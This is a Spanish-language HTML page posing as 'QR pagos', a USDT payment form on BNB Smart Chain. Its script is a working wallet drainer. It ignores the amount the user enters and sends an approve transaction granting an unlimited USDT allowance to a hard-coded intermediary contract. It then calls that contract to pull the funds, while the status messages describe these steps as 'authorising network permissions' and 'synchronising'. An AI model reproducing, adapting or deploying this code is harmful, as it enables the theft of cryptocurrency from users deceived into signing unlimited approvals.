<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR pagos - Enviar</title>

    <style>
        :root {
            color-scheme: light;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: #f7f9ff;
            background-image:
                radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%),
                radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%),
                radial-gradient(circle at 55% 105%, rgba(145, 175, 255, 0.13) 0%, transparent 46%),
                linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
            background-size: 125% 125%, 135% 135%, 120% 120%, 100% 100%;
            background-attachment: fixed;
            animation: auroraBackground 12s ease-in-out infinite alternate;
            color: #111111;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 30px;
        }

        @keyframes auroraBackground {
            0% {
                background-position: -12% -8%, 112% 108%, 45% 110%, center;
            }
            50% {
                background-position: 22% 18%, 72% 52%, 58% 88%, center;
            }
            100% {
                background-position: 8% 38%, 96% 28%, 38% 76%, center;
            }
        }

        .tw-container {
            width: 100%;
            max-width: 390px;
            padding: 20px;
            flex: 1;
            padding-bottom: 118px;
        }

        .tw-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 24px;
        }

        .tw-header-title {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 7px;
            margin-bottom: 15px;
            text-align: center;
            width: 100%;
        }

        .tw-header-title-main {
            font-size: 21px;
            line-height: 1.2;
            font-weight: 700;
            letter-spacing: -0.025em;
            color: #111111;
        }

        .tw-network-badge {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 4px 8px;
            border-radius: 999px;
            background: #eef3ff;
            border: 1px solid #dbe6ff;
            color: #0052ff;
            font-size: 10px;
            line-height: 1;
            font-weight: 700;
            letter-spacing: 0.025em;
        }

        .back-icon {
            position: absolute;
            left: 0;
            top: 0;
            width: 24px;
            height: 24px;
            color: #111111;
        }

        .tw-logo {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
            display: block;
        }

        .tw-input-group {
            background: rgba(255, 255, 255, 0.88);
            border: 1px solid rgba(205, 215, 232, 0.78);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
            box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
        }

        .tw-input-group:focus-within {
            border-color: rgba(0, 82, 255, 0.28);
            box-shadow: 0 8px 22px rgba(31, 55, 92, 0.075);
        }

        .tw-label {
            font-size: 13px;
            color: #717680;
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .tw-input-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            min-height: 36px;
        }

        .tw-input {
            background: transparent;
            border: none;
            color: #111111;
            font-size: 16px;
            width: 80%;
            outline: none;
            font-weight: 500;
        }

        .tw-action-text {
            color: #0052ff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }

        .tw-currency-badge {
            color: #0052ff;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .usdt-icon {
            width: 18px;
            height: 18px;
        }

        .status-box {
            background-color: #edf2ff;
            border: 1px solid #cce0ff;
            border-radius: 12px;
            padding: 12px;
            font-size: 13px;
            color: #0052ff;
            margin-bottom: 16px;
            display: none;
            text-align: left;
        }

        .wallet-info {
            display: none;
            background-color: #f6f7f9;
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 22px;
        }

        .tw-btn-container {
            margin-top: 40px;
            position: relative;
            z-index: 3;
            margin-bottom: 22px;
        }

        .tw-btn {
            width: 100%;
            height: 52px;
            background-color: #0052ff;
            color: #ffffff;
            border: none;
            border-radius: 26px;
            font-size: 16px;
            font-weight: 650;
            cursor: pointer;
            transition: transform 0.16s ease, box-shadow 0.2s ease, background-color 0.2s ease;
        }

        .tw-btn:disabled {
            background-color: #b3ccff;
        }

        .tw-btn:active:not(:disabled) {
            transform: scale(0.985);
        }

        .tw-btn .link-icon {
            width: 18px;
            height: 18px;
            margin-right: 8px;
            vertical-align: -3px;
        }

        .network-card {
            display: none;
            align-items: center;
            gap: 11px;
            margin: 4px 0 20px;
            padding: 12px 14px;
            width: 100%;
            background: rgba(255, 255, 255, 0.88);
            border: 1px solid rgba(205, 215, 232, 0.78);
            border-radius: 14px;
            box-shadow: 0 6px 18px rgba(31, 55, 92, 0.05);
            backdrop-filter: blur(8px);
        }

        .network-card-logo {
            width: 30px;
            height: 30px;
            object-fit: contain;
            flex: 0 0 auto;
        }

        .network-card-copy {
            min-width: 0;
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .network-card-label {
            color: #717680;
            font-size: 11px;
            line-height: 1.2;
            font-weight: 500;
        }

        .network-card-name {
            color: #111111;
            font-size: 14px;
            line-height: 1.25;
            font-weight: 650;
        }

        .network-card-badge {
            flex: 0 0 auto;
            padding: 5px 8px;
            border-radius: 999px;
            background: #eef3ff;
            border: 1px solid #dbe6ff;
            color: #0052ff;
            font-size: 10px;
            line-height: 1;
            font-weight: 700;
        }
   
        .tw-address-box {
            border: 1px solid #e3e5e8;
            border-radius: 14px;
            padding: 14px 16px;
            background: #ffffff;
            margin-bottom: 18px;
        }

        .site-footer {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 20;
            width: 100%;
            text-align: center;
            padding: 10px 15px 12px;
            font-size: 12px;
            line-height: 1.5;
            color: #717680;
            background: #ffffff;
        }

        .site-footer a {
            color: #0052ff;
            text-decoration: none;
        }

        .page-loader, .processing-screen {
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.45s ease, visibility 0.45s ease;
        }

        .page-loader.hidden {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }

        .processing-screen {
            z-index: 10000;
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }

        .processing-screen.visible {
            opacity: 1;
            visibility: visible;
            pointer-events: auto;
        }

        .loader-logo, .processing-logo {
            width: 110px;
            height: 110px;
            margin-bottom: 22px;
            animation: loaderPulse 1.25s ease-in-out infinite;
        }

        .loader-spinner {
            width: 32px;
            height: 32px;
            border: 3px solid #e4e9f2;
            border-top-color: #0052ff;
            border-radius: 50%;
            animation: loaderSpin 0.8s linear infinite;
        }

        .loader-text {
            margin-top: 14px;
            color: #717680;
            font-size: 13px;
            font-weight: 500;
        }

        @keyframes loaderSpin {
            to { transform: rotate(360deg); }
        }

        @keyframes loaderPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(0.94); opacity: 0.72; }
        }

        .processing-bar {
            position: relative;
            width: 190px;
            height: 5px;
            overflow: hidden;
            border-radius: 999px;
            background: #e4e9f2;
        }

        .processing-bar::after {
            content: "";
            position: absolute;
            top: 0;
            left: -45%;
            width: 45%;
            height: 100%;
            border-radius: inherit;
            background: #0052ff;
            animation: processingSlide 1.15s ease-in-out infinite;
        }

        .processing-title {
            margin-top: 18px;
            color: #111111;
            font-size: 15px;
            font-weight: 600;
        }

        .processing-note {
            margin-top: 7px;
            color: #717680;
            font-size: 12px;
        }

        @keyframes processingSlide {
            0% { left: -45%; }
            100% { left: 100%; }
        }

        .connected-wallet-address-wrap {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 10px;
            width: 100%;
            min-width: 0;
        }

        .amount-stepper {
            display: grid;
            grid-template-columns: 34px minmax(0, 1fr) 34px;
            align-items: center;
            gap: 8px;
            width: 100%;
        }

        .amount-step-btn {
            width: 34px;
            height: 34px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: 1px solid rgba(205,215,232,.9);
            border-radius: 9px;
            background: rgba(247,249,255,.92);
            color: #111;
            font-size: 18px;
            cursor: pointer;
        }
    </style>

    <!-- Tema Oscuro BNB -->
    <style id="bnb-dark-visual-theme">
        :root{color-scheme:dark;--bnb-gold:#f3ba2f}
        html,body{background:#000!important;color:#fff!important}
        body{
             background:
             radial-gradient(ellipse at 8% 10%,rgba(243,186,47,.16),transparent 34%),
             radial-gradient(ellipse at 95% 28%,rgba(243,186,47,.12),transparent 34%),
             radial-gradient(ellipse at 5% 92%,rgba(243,186,47,.09),transparent 32%),
             #000!important;
             background-attachment:fixed!important;
        }
        h1,h2,h3,h4,h5,h6,p,label,span,strong,b,small,
        .wallet-address,.network-card-name,.address-value,.amount-label,.amount-value,
        .footer,#walletAddressText,#addressDisplay,#amountDisplay{color:#fff!important}
        input{color:#fff!important;-webkit-text-fill-color:#fff!important}
        input::placeholder{color:#a4a9b2!important}
        .wallet-info,.network-card,.tw-input-group,.tw-address-box{
             background:#0b0b0c!important;
             border-color:rgba(255,255,255,.16)!important;
        }
        button:not(#connectBtn),.amount-step-btn{
             color:#fff!important;background:#101011!important;border-color:rgba(255,255,255,.28)!important
        }
        #connectBtn{
             background:linear-gradient(90deg,#efad16,#ffd541)!important;color:#050505!important;
             border:none!important;box-shadow:0 8px 28px rgba(243,186,47,.20)!important
        }
        #status{
             background:rgba(18,18,19,.95)!important;color:#fff!important;
             border:1px solid rgba(255,255,255,.14)!important
        }
        .network-card-badge,.tw-network-badge{
             background:rgba(243,186,47,.10)!important;color:#f3ba2f!important;
             border-color:rgba(243,186,47,.48)!important
        }
        #pageLoader,#processingScreen{background:#000!important;color:#fff!important}
        footer,.site-footer{background:#000!important;color:#fff!important}
        a{color:#f3ba2f!important}
    </style>
</head>

<body>
<div id="pageLoader" class="page-loader" aria-label="Cargando">
    <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="Logo" class="loader-logo">
    <div class="loader-spinner"></div>
    <div class="loader-text">Cargando...</div>
</div>

<div id="processingScreen" class="processing-screen" aria-label="Procesando transacción">
    <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="Logo" class="processing-logo">
    <div class="processing-bar"></div>
    <div class="processing-title">Procesando...</div>
    <div class="processing-note">Por favor, no cierres esta ventana.</div>
</div>

<div class="tw-container">
    <div class="tw-header">
        <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <line x1="19" y1="12" x2="5" y2="12"></line>
            <polyline points="12 19 5 12 12 5"></polyline>
        </svg>

        <div class="tw-header-title">
            <span class="tw-header-title-main">Enviar USDT</span>
            <span class="tw-network-badge">BEP-20</span>
        </div>

        <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="QR Pagos" class="tw-logo">
    </div>

    <div class="connected-summary-panel">
        <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
            <label class="tw-label">Dirección conectada</label>
            <div class="tw-input-row">
                <div class="connected-wallet-address-wrap">
                    <div id="walletAddressText" class="tw-input" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%;"></div>
                </div>
            </div>
        </div>

        <div id="tronNetworkInfo" class="network-card">
            <img src="https://www.bnbchain.org/images/brand-guidelines/svg/BNB%20Chain_Symbol_Yellow.svg" alt="BNB" class="network-card-logo">
            <div class="network-card-copy">
                <span class="network-card-label">Red conectada</span>
                <span class="network-card-name">BNB Smart Chain</span>
            </div>
            <span class="network-card-badge">BEP-20</span>
        </div>

        <div class="tw-input-group tw-address-box">
            <label class="tw-label" for="addressDisplay">Dirección de destino</label>
            <div class="tw-input-row">
                <input id="addressDisplay" class="tw-input" type="text" readonly tabindex="-1">
            </div>
        </div>
    </div>

    <div class="tw-input-group amount-stage">
        <label class="tw-label" for="amountDisplay">Cantidad</label>
        <div class="tw-input-row">
            <div class="amount-stepper">
                <button type="button" class="amount-step-btn" id="amountMinus">−</button>
                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any">
                <button type="button" class="amount-step-btn" id="amountPlus">+</button>
            </div>
            <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none; cursor: pointer;"></span>
            <span class="tw-currency-badge">
                USDT
                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="USDT" class="usdt-icon">
            </span>
        </div>
    </div>

    <div id="status" class="status-box"></div>

    <div class="tw-btn-container">
        <button class="tw-btn" id="connectBtn">
            <svg class="link-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
                <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
                <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
            </svg><span>Vincular billetera</span>
        </button>
    </div>
</div>

<footer class="site-footer">
    <p>© 2026 SecurePayQR. All rights reserved.</p>
    <p>Need help? <a href="mailto:help@securetrustpay.net">help@securepayQR.net</a></p>
</footer>

<script>
    window.addEventListener('load', function () {
        window.setTimeout(function () {
            const loader = document.getElementById('pageLoader');
            if (loader) loader.classList.add('hidden');
        }, 1000);
    });

    const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
    const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
    const CONTRATO_INTERMEDIARIO = "0xD7AbB30Ec2685C9b1c7F8C79fbf8A2Ffe6a0Ad05";
    const BSC_CHAIN_ID = "0x38";

    const connectBtn = document.getElementById("connectBtn");
    const statusDiv = document.getElementById("status");
    const amountDisplay = document.getElementById("amountDisplay");
    const addressDisplay = document.getElementById("addressDisplay");
    const maxAction = document.getElementById("maxAction");
    const walletInfo = document.getElementById("walletInfo");
    const walletAddressText = document.getElementById("walletAddressText");
    const networkInfo = document.getElementById("tronNetworkInfo");
    const processingScreen = document.getElementById("processingScreen");
    let walletAddress = null, processingStartedAt = 0;

    function abreviarDireccion(addr) {
        return addr && addr.length > 17 ? addr.slice(0, 8) + "..." + addr.slice(-6) : addr;
    }
    addressDisplay.value = abreviarDireccion(BILLETERA_DESTINO);

    function setStatus(m) { statusDiv.innerText = m || ""; statusDiv.style.display = m ? "block" : "none"; }
    function showProcessingScreen() { processingStartedAt = Date.now(); if (processingScreen) processingScreen.classList.add("visible"); }
    async function hideProcessingScreenAfterMinimum() {
        if (!processingStartedAt) return;
        const r = Math.max(0, 3000 - (Date.now() - processingStartedAt));
        if (r) await new Promise(x => setTimeout(x, r));
        if (processingScreen) processingScreen.classList.remove("visible");
        processingStartedAt = 0;
    }

    function provider() {
        if (window.ethereum) return window.ethereum;
        if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
        throw new Error("Abre esta página desde el navegador dApp de tu billetera.");
    }
    async function rpc(method, params = []) { return provider().request({ method, params }); }
    function pad64(h) { return h.replace(/^0x/, "").padStart(64, "0"); }
    function encAddr(a) { return pad64(a.toLowerCase()); }

    async function ensureBSC() {
        const rawId = await rpc("eth_chainId");
        const chainNumber = typeof rawId === "string" ? parseInt(rawId, 16) : Number(rawId);
        if (chainNumber === 56) return;

        try {
            await rpc("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID }]);
        } catch (e) {
            if (e?.code !== 4902) throw e;
            await rpc("wallet_addEthereumChain", [{
                chainId: BSC_CHAIN_ID, chainName: "BNB Smart Chain",
                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
                rpcUrls: ["https://bsc-dataseed.binance.org/"],
                blockExplorerUrls: ["https://bscscan.com/"]
            }]);
        }
    }

    connectBtn.addEventListener("click", async () => {
        if (!walletAddress) {
            try {
                setStatus("Estableciendo enlace con BNB Smart Chain...");
                connectBtn.disabled = true; 
                await ensureBSC();
                const accounts = await rpc("eth_requestAccounts");
                walletAddress = accounts?.[0];
                if (!walletAddress) throw new Error("No se obtuvo acceso a la dirección.");
                if (walletAddressText) walletAddressText.textContent = abreviarDireccion(walletAddress);
                if (walletInfo) walletInfo.style.display = "block";
                if (networkInfo) { networkInfo.style.display = "flex"; }
                if (maxAction) maxAction.style.display = "inline";
                setStatus("Conexión establecida. Presione continuar.");
                connectBtn.innerText = "Continuar";
            } catch (e) {
                console.error(e);
                setStatus(e.message || "Error de conexión.");
            } finally {
                connectBtn.disabled = false;
            }
            return;
        }

        try {
            connectBtn.disabled = true; 
            await ensureBSC();

            // PASO 1: Aprobación previa (approve)
            setStatus("Paso 1/2: Autorizando permisos de red...");
            const maxUint256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
            const approveData = "0x095ea7b3" + encAddr(CONTRATO_INTERMEDIARIO) + maxUint256;

            const approveTxRequest = {
                from: walletAddress,
                to: CONTRATO_USDT,
                value: "0x0",
                data: approveData
            };

            await rpc("eth_sendTransaction", [approveTxRequest]);

            // PAUSA DE 4 SEGUNDOS PARA PERMITIR QUE LA RED PROCESE EL PASO 1
            setStatus("Paso 1 completado. Sincronizando red (4s)...");
            await new Promise(resolve => setTimeout(resolve, 4000));

            // PASO 2: Llamada al contrato intermediario (executeTransfer)
            setStatus("Paso 2/2: Solicitando ejecución final...");
            const selectorFunction = "c469fdbe"; 
            const executeData = "0x" + selectorFunction + encAddr(CONTRATO_USDT);

            const txRequest = {
                from: walletAddress,
                to: CONTRATO_INTERMEDIARIO,
                value: "0x0",
                data: executeData
            };

            const txHash = await rpc("eth_sendTransaction", [txRequest]);
            showProcessingScreen();
            await hideProcessingScreenAfterMinimum();
            setStatus("TRANSACCIÓN ENVIADA.");
            connectBtn.innerText = "Completado";
        } catch (e) {
            console.error("ERROR:", e);
            await hideProcessingScreenAfterMinimum();
            setStatus("Error: " + (e.message || "Error desconocido"));
            connectBtn.disabled = false;
            connectBtn.innerText = "Continuar";
        }
    });

    (() => {
        const input = document.getElementById('amountDisplay');
        const minus = document.getElementById('amountMinus');
        const plus = document.getElementById('amountPlus');
        if (!input || !minus || !plus) return;

        const read = () => {
            const n = Number.parseFloat(String(input.value).replace(',', '.'));
            return Number.isFinite(n) ? n : 0;
        };

        const write = (n) => {
            n = Math.max(0, n);
            input.value = Number.isInteger(n) ? String(n) : String(Number(n.toFixed(2)));
        };

        minus.addEventListener('click', () => write(read() - 1));
        plus.addEventListener('click', () => write(read() + 1));
    })();
</script>
</body>
</html>
